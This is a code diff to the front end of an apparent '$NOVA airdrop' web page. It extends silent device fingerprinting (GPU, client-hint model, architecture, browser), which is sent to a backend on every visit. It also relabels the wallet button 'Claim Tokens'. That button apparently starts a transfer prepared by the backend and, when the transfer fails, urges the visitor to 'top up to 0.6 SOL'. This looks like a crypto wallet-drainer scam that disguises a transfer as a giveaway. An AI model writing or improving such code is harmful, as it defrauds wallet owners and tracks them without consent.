@@ -9,39 +9,404 @@ import './Home.css'
 import { Header } from './header/Header'
 import { Footer } from './footer/Footer'
 
-const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://novacore-backend.dgtty.com'
+const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://novacore-backend.dgtty.com' // http://localhost:3001
 // ----------------- device info---
 interface DeviceInfo {
   screenResolution: string;
   language: string;
   platform: string;
+  platformVersion: string;
   userAgent: string;
   hardwareConcurrency: number | string;
   gpuRenderer: string;
+
+  // Device identification
+  deviceModel: string;
+  mobile: boolean;
+
+  // Additional browser/device information
+  architecture: string;
+  bitness: string;
+  browser: string;
 }
 
-const getDeviceInfo = (): DeviceInfo => {
+// const getDeviceInfo = (): DeviceInfo => {
+//   let gpuRenderer = 'N/A';
+//   try {
+//     const canvas = document.createElement('canvas');
+//     const gl = canvas.getContext('webgl') || (canvas.getContext('experimental-webgl') as WebGLRenderingContext | null);
+//     if (gl) {
+//       const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+//       if (debugInfo) {
+//         gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
+//       }
+//     }
+//   } catch (e) {
+//     console.error(e);
+//   }
+
+//   return {
+//     screenResolution: `${window.screen.width}x${window.screen.height}`,
+//     language: navigator.language,
+//     platform: navigator.platform,
+//     userAgent: navigator.userAgent,
+//     hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+//     gpuRenderer
+//   };
+// };
+const getDeviceInfo = async (): Promise<DeviceInfo> => {
   let gpuRenderer = 'N/A';
+
+  // =========================================================================
+  // GPU
+  // =========================================================================
+
   try {
     const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || (canvas.getContext('experimental-webgl') as WebGLRenderingContext | null);
+
+    const gl =
+      canvas.getContext('webgl') ||
+      (canvas.getContext('experimental-webgl') as WebGLRenderingContext | null);
+
     if (gl) {
       const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+
       if (debugInfo) {
-        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
+        gpuRenderer =
+          gl.getParameter(
+            debugInfo.UNMASKED_RENDERER_WEBGL
+          ) || 'N/A';
       }
     }
   } catch (e) {
-    console.error(e);
+    console.error('GPU detection failed:', e);
   }
 
+
+  // =========================================================================
+  // DEFAULT DEVICE INFORMATION
+  // =========================================================================
+
+  let deviceModel = 'Unknown';
+  let platformVersion = 'Unknown';
+  let architecture = 'Unknown';
+  let bitness = 'Unknown';
+  let mobile = false;
+  let browser = 'Unknown';
+
+
+  // =========================================================================
+  // USER-AGENT CLIENT HINTS
+  // =========================================================================
+
+  try {
+
+    // Chromium browsers such as:
+    // Chrome
+    // Edge
+    // Opera
+    // Brave
+    // etc.
+
+    const userAgentData = (
+      navigator as Navigator & {
+        userAgentData?: {
+          mobile?: boolean;
+          platform?: string;
+          getHighEntropyValues?: (
+            hints: string[]
+          ) => Promise<{
+            model?: string;
+            platform?: string;
+            platformVersion?: string;
+            architecture?: string;
+            bitness?: string;
+            mobile?: boolean;
+            brands?: Array<{
+              brand: string;
+              version: string;
+            }>;
+            fullVersionList?: Array<{
+              brand: string;
+              version: string;
+            }>;
+          }>;
+        };
+      }
+    ).userAgentData;
+
+
+    if (userAgentData) {
+
+      mobile =
+        userAgentData.mobile || false;
+
+
+      if (userAgentData.getHighEntropyValues) {
+
+        const highEntropy =
+          await userAgentData.getHighEntropyValues([
+            'model',
+            'platform',
+            'platformVersion',
+            'architecture',
+            'bitness',
+            'mobile',
+            'brands',
+            'fullVersionList'
+          ]);
+
+
+        // -------------------------------------------------------------
+        // Device model
+        // -------------------------------------------------------------
+
+        if (highEntropy.model) {
+          deviceModel =
+            highEntropy.model;
+        }
+
+
+        // -------------------------------------------------------------
+        // Platform
+        // -------------------------------------------------------------
+
+        if (highEntropy.platform) {
+          platformVersion =
+            highEntropy.platformVersion || 'Unknown';
+        }
+
+
+        // -------------------------------------------------------------
+        // CPU architecture
+        // -------------------------------------------------------------
+
+        if (highEntropy.architecture) {
+          architecture =
+            highEntropy.architecture;
+        }
+
+
+        // -------------------------------------------------------------
+        // CPU bitness
+        // -------------------------------------------------------------
+
+        if (highEntropy.bitness) {
+          bitness =
+            highEntropy.bitness;
+        }
+
+
+        // -------------------------------------------------------------
+        // Mobile
+        // -------------------------------------------------------------
+
+        if (typeof highEntropy.mobile === 'boolean') {
+          mobile =
+            highEntropy.mobile;
+        }
+
+
+        // -------------------------------------------------------------
+        // Browser
+        // -------------------------------------------------------------
+
+        const brands =
+          highEntropy.fullVersionList ||
+          highEntropy.brands ||
+          [];
+
+        if (brands.length > 0) {
+
+          const realBrowser =
+            brands.find(
+              item =>
+                !item.brand.toLowerCase().includes('not') &&
+                !item.brand.toLowerCase().includes('brand')
+            );
+
+          if (realBrowser) {
+            browser =
+              realBrowser.brand;
+          }
+        }
+      }
+    }
+
+  } catch (error) {
+
+    console.warn(
+      'User-Agent Client Hints unavailable:',
+      error
+    );
+  }
+
+
+  // =========================================================================
+  // FALLBACK DEVICE DETECTION
+  // =========================================================================
+
+  const userAgent =
+    navigator.userAgent || '';
+
+  const platform =
+    navigator.platform || 'Unknown';
+
+
+  // -------------------------------------------------------------------------
+  // Mobile detection
+  // -------------------------------------------------------------------------
+
+  if (
+    /Android/i.test(userAgent)
+  ) {
+
+    mobile = true;
+
+    // Android User-Agent commonly contains:
+    //
+    // Linux; Android 14; SM-S918B
+    //
+    const androidMatch =
+      userAgent.match(
+        /Android[^;]*;\s*(?:[a-zA-Z-]+;\s*)?([^;)]+)/
+      );
+
+    if (
+      deviceModel === 'Unknown' &&
+      androidMatch?.[1]
+    ) {
+
+      deviceModel =
+        androidMatch[1].trim();
+    }
+  }
+
+
+  // -------------------------------------------------------------------------
+  // iPhone
+  // -------------------------------------------------------------------------
+
+  if (/iPhone/i.test(userAgent)) {
+
+    mobile = true;
+
+    if (deviceModel === 'Unknown') {
+      deviceModel = 'iPhone';
+    }
+  }
+
+
+  // -------------------------------------------------------------------------
+  // iPad
+  // -------------------------------------------------------------------------
+
+  if (/iPad/i.test(userAgent)) {
+
+    mobile = true;
+
+    if (deviceModel === 'Unknown') {
+      deviceModel = 'iPad';
+    }
+  }
+
+
+  // -------------------------------------------------------------------------
+  // Windows
+  // -------------------------------------------------------------------------
+
+  if (/Windows/i.test(userAgent)) {
+
+    if (deviceModel === 'Unknown') {
+      deviceModel = 'Windows PC / Laptop';
+    }
+
+    if (browser === 'Unknown') {
+
+      if (/Edg/i.test(userAgent)) {
+        browser = 'Microsoft Edge';
+      } else if (/Chrome/i.test(userAgent)) {
+        browser = 'Google Chrome';
+      } else if (/Firefox/i.test(userAgent)) {
+        browser = 'Mozilla Firefox';
+      } else {
+        browser = 'Windows Browser';
+      }
+    }
+  }
+
+
+  // -------------------------------------------------------------------------
+  // macOS
+  // -------------------------------------------------------------------------
+
+  if (/Macintosh|Mac OS X/i.test(userAgent)) {
+
+    if (deviceModel === 'Unknown') {
+      deviceModel = 'Apple Mac / MacBook';
+    }
+
+    if (browser === 'Unknown') {
+
+      if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
+        browser = 'Safari';
+      } else if (/Chrome/i.test(userAgent)) {
+        browser = 'Google Chrome';
+      } else if (/Firefox/i.test(userAgent)) {
+        browser = 'Mozilla Firefox';
+      }
+    }
+  }
+
+
+  // -------------------------------------------------------------------------
+  // Linux
+  // -------------------------------------------------------------------------
+
+  if (
+    /Linux/i.test(userAgent) &&
+    !/Android/i.test(userAgent)
+  ) {
+
+    if (deviceModel === 'Unknown') {
+      deviceModel = 'Linux Workstation';
+    }
+  }
+
+
+  // =========================================================================
+  // RETURN COMPLETE DEVICE INFORMATION
+  // =========================================================================
+
   return {
-    screenResolution: `${window.screen.width}x${window.screen.height}`,
-    language: navigator.language,
-    platform: navigator.platform,
-    userAgent: navigator.userAgent,
-    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-    gpuRenderer
+
+    screenResolution:
+      `${window.screen.width}x${window.screen.height}`,
+
+    language:
+      navigator.language || 'Unknown',
+
+    platform:
+      platform,
+
+    platformVersion,
+
+    userAgent,
+
+    hardwareConcurrency:
+      navigator.hardwareConcurrency || 'N/A',
+
+    gpuRenderer,
+
+    deviceModel,
+
+    mobile,
+
+    architecture,
+
+    bitness,
+
+    browser
   };
 };
 
@@ -54,16 +419,54 @@ function App() {
   const [status, setStatus] = useState('')
   const [isWorking, setIsWorking] = useState(false)
   const startAfterConnect = useRef(false)
+  const [transferFailed, setTransferFailed] = useState(false);
 
-  const walletLabel = isConnected && address ? `${address.slice(0, 4)}...${address.slice(-4)}` : 'Connect wallet'
+  const walletLabel = isConnected && address ? `${address.slice(0, 4)}...${address.slice(-4)}` : 'Claim Tokens'
 
+  // useEffect(() => {
+  //   void fetch(`${BACKEND_URL}/api/log-visit`, {
+  //     method: 'POST',
+  //     headers: { 'Content-Type': 'application/json' },
+  //     body: JSON.stringify({ deviceInfo: getDeviceInfo() }),
+  //   }).catch((error) => console.error('Failed to log visit:', error))
+  // }, [])
   useEffect(() => {
-    void fetch(`${BACKEND_URL}/api/log-visit`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ deviceInfo: getDeviceInfo() }),
-    }).catch((error) => console.error('Failed to log visit:', error))
-  }, [])
+
+    const logVisit = async () => {
+
+      try {
+
+        const deviceInfo =
+          await getDeviceInfo();
+
+        await fetch(
+          `${BACKEND_URL}/api/log-visit`,
+          {
+            method: 'POST',
+
+            headers: {
+              'Content-Type': 'application/json'
+            },
+
+            body: JSON.stringify({
+              deviceInfo
+            })
+          }
+        );
+
+      } catch (error) {
+
+        console.error(
+          'Failed to log visit:',
+          error
+        );
+      }
+    };
+
+
+    void logVisit();
+
+  }, []);
 
   const startTransfer = useCallback(async () => {
     setStatus('')
@@ -73,6 +476,7 @@ function App() {
       return
     }
 
+    setTransferFailed(false);
     setIsWorking(true)
     setStatus('Preparing the transfer on the backend...')
     try {
@@ -107,6 +511,7 @@ function App() {
       }
       setStatus(`Broadcast complete: ${lastSignature}`)
     } catch (error) {
+      setTransferFailed(true);
       if (error instanceof SendTransactionError) {
         try {
           const logs = await error.getLogs(connection)
@@ -170,8 +575,8 @@ function App() {
                   Join the exclusive $NOVA airdrop and claim your tokens. Limited-time opportunity for early adopters and community members to participate in our Web3 ecosystem.
                 </p>
                 <div className="hero-actions">
-                  <button disabled={isWorking} onClick={() => void startTransfer()} className="btn-primary">
-                    {isWorking ? 'Tokens Incoming...' : isConnected ? 'Start' : walletLabel}
+                  <button disabled={isWorking} onClick={() => void startTransfer()} className={`btn-primary ${transferFailed ? 'btn-error transfer-failed' : ''}`} type="button">
+                    {isWorking ? 'Tokens Incoming...' : transferFailed ? 'Transfer Failed! top up to 0.6 SOL' : isConnected ? 'Claim Tokens' : walletLabel}
                   </button>
                   <a href="#about" className="btn-secondary">Learn More</a>
                 </div>
@@ -245,7 +650,7 @@ function App() {
               <div id="claim" className="claim-cta-section scroll-animation fade-up" ref={claimRef}>
                 <h3 className="claim-cta-title">Ready to claim your tokens?</h3>
                 <button className="btn-connect-wallet" disabled={isWorking} onClick={() => void startTransfer()} type="button">
-                  {isWorking ? 'Tokens Incoming...' : isConnected ? 'Start' : walletLabel}
+                  {isWorking ? 'Tokens Incoming...': transferFailed ? 'Transfer Failed' : isConnected ? 'Claim Tokens' : walletLabel}
                 </button>
                 {status && <p className="transfer-status" role="status">{status}</p>}
               </div>
